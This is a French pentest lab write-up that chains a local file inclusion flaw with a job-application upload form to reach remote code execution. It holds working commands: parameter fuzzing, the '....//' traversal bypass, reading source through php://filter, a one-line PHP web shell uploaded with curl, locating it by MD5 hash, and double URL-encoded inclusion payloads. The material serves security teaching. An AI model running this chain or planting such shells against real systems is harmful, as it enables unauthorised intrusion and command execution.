# Lab - Chainer LFI et upload de fichiers

## Scénario

On intervient sur le site vitrine d'une entreprise. Le RSSI précise qu'un audit précédent n'avait rien trouvé, mais qu'un formulaire de candidature a été ajouté depuis. C'est notre point d'entrée prioritaire.

L'objectif est clair : identifier une vulnérabilité d'inclusion de fichiers, l'exploiter pour obtenir une exécution de code à distance, et lire un fichier sensible à la racine du serveur.

{% hint style="info" %}
Ce type de scénario est fréquent en pentest web. Les fonctionnalités ajoutées après un premier audit sont souvent moins bien testées que le reste de l'application.
{% endhint %}

***

## Approche

La méthodologie se décompose en plusieurs phases. On commence par de la reconnaissance, puis on enchaîne avec l'exploitation en combinant deux vulnérabilités distinctes.

### 1. Découverte de paramètres cachés

Les formulaires HTML visibles ne sont pas les seuls points d'entrée. Certains paramètres GET sont utilisés en backend sans être exposés dans l'interface. On commence par fuzzer les paramètres de chaque page pour en trouver d'éventuels non documentés.

### 2. Test d'inclusion locale

Une fois un paramètre identifié, on teste s'il est vulnérable à une inclusion de fichiers. Si un filtre basique est en place (suppression de `../`), on tente des contournements classiques comme le double-point non récursif (`....//`).

### 3. Lecture du code source

Avec un LFI confirmé, on utilise les filtres PHP (`php://filter/read=convert.base64-encode/resource=...`) pour lire le code source du gestionnaire d'upload. Cette étape est indispensable pour comprendre comment et où les fichiers téléversés sont stockés.

### 4. Upload d'un web shell

On exploite le formulaire de candidature pour déposer un fichier PHP malveillant. Même si l'application vérifie le type de fichier, il arrive que l'extension ne soit pas correctement filtrée.

### 5. Chaînage LFI + upload

En combinant le chemin d'upload (découvert dans le code source) avec le LFI, on obtient l'exécution du web shell et donc la possibilité de lancer des commandes système.

{% hint style="warning" %}
Si le paramètre LFI filtre certains caractères (points, slashs), il faut parfois recourir au double encodage URL pour contourner la restriction.
{% endhint %}

***

## Commandes

### Fuzzing des paramètres

On cherche un paramètre caché sur la page de contact :

```bash
ffuf -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u "http://<IP_CIBLE>:<PORT>/contact.php?FUZZ=value" \
     -fs <TAILLE_REPONSE_NORMALE>
```

Le résultat révèle un paramètre comme `region`, absent du formulaire visible.

### Test de LFI

On fuzz ce paramètre avec une wordlist spécialisée :

```bash
ffuf -w /opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://<IP_CIBLE>:<PORT>/contact.php?region=FUZZ" \
     -fs <TAILLE_REPONSE_NORMALE>
```

Si le filtre supprime `../` de façon non récursive, les payloads du type `....//....//....//etc/passwd` passent et renvoient le contenu du fichier.

{% hint style="success" %}
La wordlist LFI-Jhaddix.txt contient des variantes avec différents encodages et contournements. C'est un bon point de départ pour identifier rapidement le type de filtre en place.
{% endhint %}

### Lecture du code source de l'upload

On utilise le filtre base64 de PHP pour lire le code du gestionnaire d'upload sans l'exécuter :

```bash
curl -s "http://<IP_CIBLE>:<PORT>/contact.php?region=....//....//....//....//var/www/html/api/application.php" \
  | grep -oP '[A-Za-z0-9+/=]{50,}' | base64 -d
```

Ou directement via le wrapper PHP :

```
....//....//....//....//....//php://filter/read=convert.base64-encode/resource=api/application
```

{% hint style="info" %}
Dans le code source, on repère typiquement une ligne comme :
`$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;`
Cela signifie que le fichier uploadé est renommé avec le hash MD5 de son contenu temporaire, suivi de l'extension d'origine.
{% endhint %}

### Préparation et upload du web shell

On crée un fichier PHP minimaliste :

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

On l'upload via le formulaire de candidature (ou directement via curl si on connaît l'endpoint) :

```bash
curl -s -X POST "http://<IP_CIBLE>:<PORT>/api/application.php" \
     -F "file=@shell.php" \
     -F "name=test" \
     -F "email=test@test.com"
```

### Calcul du chemin d'accès

Puisque le serveur renomme le fichier avec le hash MD5, on le calcule localement :

```bash
md5sum shell.php
# - resultat : d85dc29474011fda185dacd2be12a2d6  shell.php
```

Le fichier sera accessible à `../uploads/d85dc29474011fda185dacd2be12a2d6.php`.

{% hint style="warning" %}
Le hash est calculé sur le fichier temporaire (`$tmp_name`), pas sur le fichier local. Si le serveur modifie le contenu avant de hasher (ce qui est rare), le hash local ne correspondra pas. En pratique, le contenu est identique dans la majorité des cas.
{% endhint %}

### Exploitation via LFI

On combine le LFI avec le chemin du fichier uploadé pour exécuter des commandes :

```bash
curl -s "http://<IP_CIBLE>:<PORT>/contact.php?region=....//....//....//uploads/d85dc29474011fda185dacd2be12a2d6.php&cmd=id"
```

Si le paramètre `region` filtre certains caractères (`.`, `/`), on passe au double encodage URL :

```bash
# - le point (.) devient %252e, le slash (/) devient %252f
curl -s "http://<IP_CIBLE>:<PORT>/contact.php?region=%252e%252e%252e%252e%252f%252f%252e%252e%252e%252e%252f%252fuploads%252fd85dc29474011fda185dacd2be12a2d6%252ephp&cmd=id"
```

Une fois l'exécution confirmée, on peut lire le fichier cible :

```bash
curl -s "http://<IP_CIBLE>:<PORT>/contact.php?region=<PAYLOAD_ENCODE>&cmd=ls+-al+/"
curl -s "http://<IP_CIBLE>:<PORT>/contact.php?region=<PAYLOAD_ENCODE>&cmd=cat+/<NOM_DU_FICHIER>"
```

***

## Ce qu'on en retient

### Le chaînage de vulnérabilités fait la différence

Ni le LFI ni l'upload seuls ne suffisaient ici pour obtenir une exécution de code. C'est la combinaison des deux qui crée la chaîne d'exploitation complète. En pentest, cette capacité à assembler des vulnérabilités de faible ou moyenne criticité pour obtenir un impact maximal est ce qui sépare un rapport superficiel d'un audit approfondi.

### La lecture du code source est une étape clé

Sans la lecture du fichier `application.php` via le filtre PHP, il aurait été très difficile de deviner le schéma de nommage des fichiers uploadés (hash MD5 du contenu). Les filtres PHP transforment un simple LFI en outil de reconnaissance puissant.

### Les filtres non récursifs sont un classique

Le contournement `....//` pour un filtre qui supprime `../` une seule fois est l'un des bypasses les plus courants. Dès qu'on identifie ce comportement, on sait que le filtre est fragile. Un filtre robuste devrait appliquer la suppression en boucle jusqu'à ce qu'il n'y ait plus de motif à supprimer.

### Le double encodage URL sauve la mise

Quand l'application filtre les caractères spéciaux au niveau de l'URL, le double encodage (`%252e` au lieu de `%2e`) permet de contourner la vérification. Le serveur web décode une première fois, puis la fonction vulnérable décode une seconde fois, reconstituant le payload original.

{% hint style="info" %}
En situation réelle, tester systématiquement l'encodage simple puis double est un réflexe à adopter dès qu'un payload est bloqué par un filtre de caractères.
{% endhint %}

### Mémo express

| Etape | Action | Outil / Commande |
|---|---|---|
| Paramètres cachés | Fuzzer les GET params | `ffuf -w burp-parameter-names.txt` |
| LFI discovery | Tester les payloads connus | `ffuf -w LFI-Jhaddix.txt` |
| Source disclosure | Lire le code PHP | `php://filter/read=convert.base64-encode` |
| Upload shell | Déposer un fichier PHP | `curl -F "file=@shell.php"` |
| Hash du fichier | Trouver le nom serveur | `md5sum shell.php` |
| Exécution | Chaîner LFI + upload | LFI vers `../uploads/<hash>.php&cmd=...` |
| Bypass filtre | Double encodage URL | `%252e%252e%252f%252f` |

***
